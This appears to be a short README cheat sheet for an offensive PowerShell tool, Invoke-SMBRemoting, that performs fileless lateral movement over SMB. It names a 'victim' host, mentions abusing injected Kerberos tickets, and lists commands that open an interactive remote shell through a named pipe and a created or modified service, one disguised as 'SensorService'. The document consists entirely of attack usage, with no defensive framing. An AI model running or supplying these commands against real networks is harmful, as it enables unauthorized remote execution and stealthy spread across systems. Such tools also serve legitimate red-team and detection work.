# FileLess Lateral Movement - Powershell Implementation
*NOTE: We need admin access to SMB on the victim, can be abused using also injected kerberos ticket!*
### Cheetsheet:

<ins>Interactive Shell</ins>
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Verbose`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -ServiceName SensorService -Verbose`
